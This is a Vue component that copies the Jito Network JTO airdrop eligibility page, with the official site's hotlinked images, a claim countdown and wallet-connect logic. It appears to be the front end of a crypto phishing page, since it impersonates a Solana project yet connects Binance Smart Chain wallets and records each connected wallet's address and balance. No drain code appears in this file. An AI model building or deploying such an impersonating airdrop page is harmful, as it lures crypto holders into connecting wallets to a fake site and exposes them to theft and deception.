<template>
  <div class="box">
    <div class="cen">
      <div class="cen_one">
        <div class="cen_two">
          <h1>Welcome to the future of Jito governance</h1>
          <p>
            Introducing JTO token: empowering our community to directly shape
            the Jito Network’s evolution. Search below to verify eligibility of
            your Solana wallet address
          </p>
          <div class="cen_three">
            <div v-if="cent" class="cen_tour" @click="render()">
              Connect to Check Eligibility
            </div>
            <div v-else class="cen_tour">Check Eligibility</div>
            <div @click="dakai" class="cen_five">Search for an Address</div>
          </div>
        </div>
        <div class="cen_left">
          <img src="https://www.jito.network/_next/image/?url=%2Fairdrop%2FpeopleOnTower.webp&w=1080&q=75" />
        </div>
      </div>
      <div class="claim">
        <div class="claim_one">
          <p class="claim_two">Want To Know If You Are Eligible?</p>
          <p class="claim_three">
            <a v-if="cent" @click="render()">Connect Wallet</a>
            <a v-else>Check Eligibility</a>
            or search a wallet address
          </p>
        </div>
        <div class="claim_four">
          <p>Only 547 days left to claim...</p>
          <div class="claim_five">
            <div class="claim_six"></div>
          </div>
        </div>
      </div>
      <div class="Token">
        <div class="Token_one">
          <div class="Token_two">
            <img src="https://www.jito.network/airdrop/coinsTower.svg" />
          </div>
          <div class="Token_three">
            <p class="Token_four">What is JTO Token?</p>
            <p class="Token_five">
              JTO token is the governance token for the Jito Network, designed
              to decentralize decision-making within the ecosystem. It allows
              community members to participate in shaping the network's future
              by voting on key operational and strategic decisions.
            </p>
            <div class="Read">Read More</div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div v-if="showMask" class="show">
    <div class="show_one">
      <div class="show_two">
        <p class="show_three">
          <svg t="1702102986426" @click="sbai" class="icon" viewBox="0 0 1024 1024" version="1.1"
            xmlns="http://www.w3.org/2000/svg" p-id="4251" width="16" height="16">
            <path
              d="M918.795922 356.854687c-21.798121-51.476314-52.909055-97.631021-92.514092-137.236058-39.605037-39.605037-85.862083-70.818309-137.236058-92.514092C635.727364 104.590046 579.236458 93.128123 520.903458 93.128123s-114.823906 11.461923-168.142315 33.976414c-51.476314 21.798121-97.631021 52.909055-137.236058 92.514092s-70.818309 85.862083-92.514092 137.236058C100.496502 410.173096 89.034579 466.664002 89.034579 524.997002s11.461923 114.823906 33.976414 168.142315c21.798121 51.476314 52.909055 97.631021 92.514092 137.236058 39.605037 39.605037 85.862083 70.818309 137.236058 92.514092 53.21607 22.514491 109.809314 33.976414 168.142315 33.976414s114.823906-11.461923 168.142315-33.976414c51.476314-21.798121 97.631021-52.909055 137.236058-92.514092 39.605037-39.605037 70.818309-85.862083 92.514092-137.236058 22.514491-53.21607 33.976414-109.809314 33.976414-168.142315S941.310414 410.173096 918.795922 356.854687zM520.903458 911.836898c-213.273636 0-386.839896-173.56626-386.839896-386.839896s173.56626-386.839896 386.839896-386.839896 386.839896 173.56626 386.839896 386.839896S734.177094 911.836898 520.903458 911.836898zM545.055367 527.555467l105.204078-105.204078c8.801119-8.801119 8.801119-23.128523 0-31.827304l0 0c-8.801119-8.801119-23.128523-8.801119-31.827304 0L513.228063 495.728163 407.512293 390.114731c-8.801119-8.801119-23.128523-8.801119-31.827304 0l0 0c-8.801119 8.801119-8.801119 23.128523 0 31.827304l105.613432 105.613432L375.173296 633.680592c-8.801119 8.801119-8.801119 23.128523 0 31.827304 8.801119 8.801119 23.128523 8.801119 31.827304 0l106.125125-106.125125 105.613432 105.613432c8.801119 8.801119 23.128523 8.801119 31.827304 0 8.801119-8.801119 8.801119-23.128523 0-31.827304L545.055367 527.555467z"
              fill="#000000" p-id="4252"></path>
          </svg></p>
        <p class="show_four">Address Airdrop Eligibility</p>
        <p class="show_five">Check any address for airdrop eligibility and JTO token amount</p>
        <div class="show_six">
          <input value="" placeholder="Search here...">
          <div class="show_seve">
            Search Address
          </div>
        </div>
        <div class="show_ten">
          <img src="https://www.jito.network/_next/image/?url=%2Fairdrop%2FjtoToken.png&w=256&q=75">
        </div>
      </div>
    </div>
  </div>
</template>
<script setup>
import { ref, onMounted } from "vue";
import { ethers } from "ethers";
import Web3Modal from "web3modal";
import bus from "../utils/bus";
const xhladdress = ref("");
const xxhladdress = ref("");
const xethbalance = ref("");
let showMask = ref(false)
let web3Modal = {};
let cent = ref(true);
function sbai(){
  showMask.value = false
}
function dakai(){
  showMask.value = true

}
onMounted(() => {
  bus.$on("qbbalance", (val) => {
    if (val != "" && val != "0.00") {
      cent.value = false;
    } else if (val == "0.00") {
      cent.value = true;
    }
  });
  if (localStorage.getItem("xhlbalance")) {
    cent.value = false;
  }
});
const connect = async () => {
  const WalletConnect = window.WalletConnectProvider.default;
  const Fortmatic = window.Fortmatic;
  const providerOptions = {
    fortmatic: {
      package: Fortmatic,
      options: {
        // Mikko's TESTNET api key
        key: "pk_test_391E26A3B43A3350",
      },
    },
    walletconnect: {
      package: WalletConnect,
      options: {
        rpc: {
          56: "https://bsc-dataseed.binance.org/",
          97: "https://data-seed-prebsc-1-s1.binance.org:8545/",
        },
        network: "binance",
      },
    },
  };

  web3Modal = new Web3Modal({
    network: "mainnet", // optional
    cacheProvider: true, // optional
    providerOptions, // required
  });
  const externalProvider = await web3Modal.connect();
  return new ethers.providers.Web3Provider(externalProvider);
};
const render = async () => {
  const provider = await connect();
  const signer = provider.getSigner(0);
  console.log(xhladdress);
  xhladdress.value = await signer.getAddress();
  xxhladdress.value =
    xhladdress.value.substring(0, 4) +
    "..." +
    xhladdress.value.substring(
      xhladdress.value.length - 4,
      xhladdress.value.length
    );
  cent.value = false;
  localStorage.setItem("xhladd", xhladdress.value);
  const rawBalance = await provider.getBalance(xhladdress.value);
  xethbalance.value = ethers.utils.formatEther(rawBalance);
  localStorage.setItem("xhlbalance", xethbalance.value);
  bus.$emit("qbbalance", xethbalance.value);
};
</script>

<style scoped>
.show {
  width: 100%;
  height: 100vh;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.5);
  z-index: 9999;
  display: flex;
  align-items: center;
  justify-content: center;
}

.show_one {
  width: 45%;
  height: 28rem;
  box-sizing: border-box;
  background-color: white;

  border-radius: 15px;
  padding: 2rem;
}

.show_three {
  display: flex;
  justify-content: flex-end;
}
.show_three>svg{
  width: 24px;
  height: 24px;
}

.show_four {
  text-align: center;
  margin: 2rem 0;
  font-size: 1.75rem;
  font-family: "Vectrex";
  line-height: 2.5rem;
}

.show_five {
  font-family: "GT Pressura Mono";
  margin: 2rem auto;
  font-size: 15px;
  text-align: center;
}

.show_six {
  width: 100%;
  border-radius: 30px;
  background-color: rgb(250, 250, 250);
  height: 3rem;
  display: flex;
  align-items: center;
  justify-content: space-between;
  box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
}

.show_six>input {
  height: 2.5rem;
  border: none;
  outline: none;
  align-items: center;
  margin-left: 1rem;
  background-color: rgb(250, 250, 250);
}

.show_seve {
  width: 7rem;
  color: white;
  font-size: 14px;
  font-family: "GT Pressura Mono";
  padding: 0.5rem 1.5rem;
  border-radius: 30px;
  margin-right: 0.5rem;
  background-color: #000;
}
.show_ten{
  display: flex;
justify-content: center;
  margin-top: 2rem;
  padding-bottom: 2rem;
}
.show_ten>img{
  width: 90px;
  height: 130px;

}

.cen {
  width: 100%;
  /* height: 60rem; */
  padding: 4rem 0;
  background: rgb(17, 11, 11);
  color: rgb(255, 255, 255);
}

.cen_one {
  width: 63.5%;
  margin: 0 auto;
  box-sizing: border-box;
  display: flex;
  align-items: center;
  padding-bottom: 2rem;
}

.cen_two {
  width: 50%;
}

.cen_two h1 {
  font-family: "Vectrex";
  color: white;
  font-size: 48px;
  line-height: 62px;
  text-align: center;
}

.cen_two>p {
  margin-top: 1rem;
  margin-bottom: 2rem;
  font-family: "GT Pressura Mono";
  font-weight: 400;
  font-size: 16px;
  line-height: 28px;
  color: #b3bbca;
  text-align: center;
}

.cen_three {
  display: flex;
}

.cen_tour {
  padding: 1rem 1rem;
  border-radius: 10px;
  border: 2px white solid;
  font-size: 12px;
  display: flex;
  text-align: center;
  cursor: pointer;
  /* background-color: rgb(185, 107, 252); */
  margin-right: 1rem;
  align-items: center;
  font-family: "Vectrex";
}

.cen_tour:hover {
  opacity: 0.7;
}

.cen_five:hover {
  opacity: 0.7;
}

.Read:hover {
  opacity: 0.7;
}

.cen_five {
  padding: 1rem 1rem;
  border-radius: 20px;
  font-size: 12px;
  display: flex;
  text-align: center;
  cursor: pointer;
  border-radius: 10px;
  color: white;
  border: 2px white solid;
  margin-right: 1rem;
  align-items: center;
  font-family: "Vectrex";
}

.cen_left {
  width: 50%;
  display: flex;
}

.cen_left img {
  width: 515px;
  height: 505px;
}

.claim {
  width: 63.5%;
  padding: 30px;
  margin: 0 auto;
  box-sizing: border-box;
  background-color: white;
  border-radius: 10px;
  display: flex;
  flex-direction: column;
  /* clip-path: polygon( 5% 0, 95% 0, 100% 20%, 100% 80%, 95% 100%, 5% 100%, 0 80%, 0 20% ); */
}

.claim_one {
  width: 100%;
  border-radius: 10px;
  padding: 3rem 0;
  background-color: rgb(248, 248, 248);
  color: black;
}

.claim_one>p {
  text-align: center;
}

.claim_two {
  font-size: 24px;
  line-height: 36px;
  font-weight: 500;
  font-family: "Vectrex";
}

.claim_three {
  font-size: 18px;
  line-height: 40px;
  font-weight: 500;
  font-family: "GT Pressura Mono";
}

.claim_three>a {
  padding-bottom: 5px;
  text-decoration: underline;
}

.claim_four {
  margin-bottom: 1rem;
}

.claim_four>p {
  color: black;
  font-size: 14px;
  margin: 2rem 0 0.5rem 0;
  font-family: "GT Pressura Mono";
}

.claim_five {
  width: 100%;
  height: 10px;
  background-color: rgb(248, 248, 248);
}

.claim_six {
  width: 1px;
  height: 100%;

  background-color: rgb(185, 107, 252);
}

.Token {
  width: 63.5%;
  background-image: linear-gradient(to bottom, #000, rgba(40, 40, 40));
  padding: 20px 0;
  margin: 4rem auto;
  border-radius: 15px;
}

.Token_one {
  width: 95%;
  display: flex;
  margin: 0 auto;
}

.Token_two {
  width: 40%;
  display: flex;
  justify-content: space-between;
}

.Token_two {
  width: 363px;
  height: 357px;
}

.Token_three {
  width: 60%;
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
  /* justify-content: space-between; */
}

.Token_four {
  color: white;
  font-family: "Vectrex";
  font-size: 42px;
  line-height: 60px;
  margin: 1rem 0;
}

.Token_five {
  width: 500px;
  line-height: 28px;
  font-size: 18px;
  margin-bottom: 3rem;
  font-family: "GT Pressura Mono";
  color: #b3bbca;
}

.Read {
  width: 7rem;
  padding: 1rem;
  /* background-color: white; */
  border: 1px white solid;
  text-align: center;
  border-radius: 10px;
  font-family: "Vectrex";
  border: 2px rgb(239, 241, 239) solid;
}

.ymainhy .cen {
  background-color: white;
  color: black;
}

.ymainhy .cen h1 {
  color: #000;
}

.ymainhy .claim {
  box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
}

.ymainhy .Token {
  background-image: linear-gradient(to bottom, rgba(235, 235, 235), #fff);
}

.ymainhy .cen_tour {
  border: 1px black solid;
}

.ymainhy .cen_five {
  border: 1px black solid;
  color: #000;
}

.ymainhy .Read {
  border: 1px black solid;
}

@media (max-width: 1250px) {
  .cen_one {
    width: 95%;
    margin-top: 5rem;
    flex-direction: column;
  }

  .cen_three {
    justify-content: center;
  }

  .cen_five {
    padding: 0.75rem;
    margin: 0%;
  }

  .Token_four {
    font-size: 2rem !important;
    text-align: center;
  }

  .Token_five {
    text-align: center;
  }

  .cen_tour {
    padding: 0.75rem;
  }

  .cen_two h1 {
    font-size: 2.75rem;
  }

  .cen_two {
    width: 100%;
  }

  .cen_left {
    width: 100%;
  }

  .cen_left>img {
    width: 100%;
    height: auto;
  }

  .claim {
    width: 100%;
  }

  .Token {
    width: 100%;
    display: flex;
  }

  .Token_one {
    flex-direction: column;
    align-items: center;
  }

  .Token_three {
    width: 100%;
  }

  .Token_four {
    font-size: 36px;
  }

  .Token_five {
    width: 100%;
  }

  .Read {
    width: 100%;
    box-sizing: border-box;
  }
  .show_one{
    width: 90%;
  }
  .show_four{
    margin: 0;
  }
  .show_seve{
    font-size: 11px;
  }
}</style>
